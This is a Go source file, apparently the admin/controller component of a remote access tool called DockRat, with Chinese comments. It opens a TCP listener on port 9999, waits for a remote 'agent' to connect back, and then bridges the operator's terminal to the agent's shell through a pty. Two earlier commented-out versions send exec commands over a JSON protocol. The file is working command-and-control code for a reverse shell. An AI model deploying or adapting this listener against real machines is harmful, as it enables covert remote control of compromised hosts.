// === /cmd/admin/main.go ===
// === file info ===
// admin 行为：
// 输入每条命令（如 cd /tmp、ls）

// 编码为结构化协议 {"type": "exec", "data": "cd /tmp"}

// 等待结果返回后显示

package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

// func main() {
// 	ln, err := net.Listen("tcp", ":9999")
// 	if err != nil {
// 		panic(err)
// 	}
// 	fmt.Println("[*] Waiting for agent to connect...")
// 	conn, err := ln.Accept()
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer conn.Close()
// 	fmt.Println("[*] Agent connected.")

// 	// goroutine 接收返回结果
// 	go func() {
// 		scanner := bufio.NewScanner(conn)
// 		for scanner.Scan() {
// 			var msg protocol.Message
// 			if err := json.Unmarshal(scanner.Bytes(), &msg); err == nil && msg.Type == "result" {
// 				fmt.Print(msg.Data)
// 			}
// 		}
// 	}()

// 	stdin := bufio.NewScanner(os.Stdin)
// 	fmt.Println("[*] Enter 'exit' to quit.")
// 	for {
// 		fmt.Print("Admin> ")
// 		if !stdin.Scan() {
// 			break
// 		}
// 		cmd := stdin.Text()
// 		if cmd == "exit" {
// 			data, _ := protocol.Encode(protocol.Message{Type: "exit", Data: ""})
// 			conn.Write(append(data, '\n'))
// 			break
// 		}
// 		msg := protocol.Message{Type: "exec", Data: cmd}
// 		data, _ := protocol.Encode(msg)
// 		conn.Write(append(data, '\n'))
// 	}
// }

// func main() {
// 	ln, err := net.Listen("tcp", ":9999")
// 	if err != nil {
// 		panic(err)
// 	}
// 	fmt.Println("[*] Waiting for agent to connect...")

// 	conn, err := ln.Accept()
// 	if err != nil {
// 		panic(err)
// 	}
// 	defer conn.Close()
// 	fmt.Println("[*] Agent connected.")
// 	fmt.Println("[*] Enter 'shell' to start interactive session.")

// 	stdin := bufio.NewScanner(os.Stdin)
// 	for {
// 		fmt.Print("Admin> ")
// 		if !stdin.Scan() {
// 			break
// 		}
// 		line := stdin.Text()
// 		if line == "shell" {
// 			msg := protocol.Message{Type: "cmd", Data: ""}
// 			data, _ := protocol.Encode(msg)
// 			conn.Write(append(data, '\n'))

// 			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to exit.")

// 			// 🔄 新增双向异步交互
// 			done := make(chan struct{})

// 			// 输入流：admin → agent shell
// 			go func() {
// 				_, _ = io.Copy(conn, os.Stdin)
// 				done <- struct{}{}
// 			}()

// 			// 输出流：agent shell → admin
// 			go func() {
// 				_, _ = io.Copy(os.Stdout, conn)
// 				done <- struct{}{}
// 			}()

// 			<-done // 任一方向断开就退出
// 			break
// 		}
// 	}
// }

func main() {
	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		panic(err)
	}
	fmt.Println("[*] Waiting for agent to connect...")

	conn, err := ln.Accept()
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Agent connected.")
	fmt.Println("[*] Enter 'shell' to start interactive session.")

	stdin := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Admin> ")
		if !stdin.Scan() {
			break
		}
		line := stdin.Text()
		if line == "shell" {
			// 发送进入 shell 模式的请求
			msg := protocol.NewCommand("")
			data, _ := protocol.EncodeWithNewline(msg)
			conn.Write(data)

			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C or 'exit' to quit.")
			startInteractiveShell(conn)
			break
		}
	}
}

// ✅ 新增函数：使用 pty 模拟 admin 本地终端，连接远程 shell
func startInteractiveShell(conn net.Conn) {
	// 创建本地 pty 会话
	cmd := exec.Command("cat") // 一个保持运行的进程
	ptmx, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Kill()
	}()

	// 将 admin 终端输入输出 → 本地 pty
	go io.Copy(ptmx, os.Stdin)
	go io.Copy(os.Stdout, ptmx)

	// 将本地 pty 与 agent 的 shell 双向绑定
	go io.Copy(conn, ptmx) // 本地 pty 输出 → agent shell 输入
	io.Copy(ptmx, conn)    // agent shell 输出 → 本地 pty 输入
}
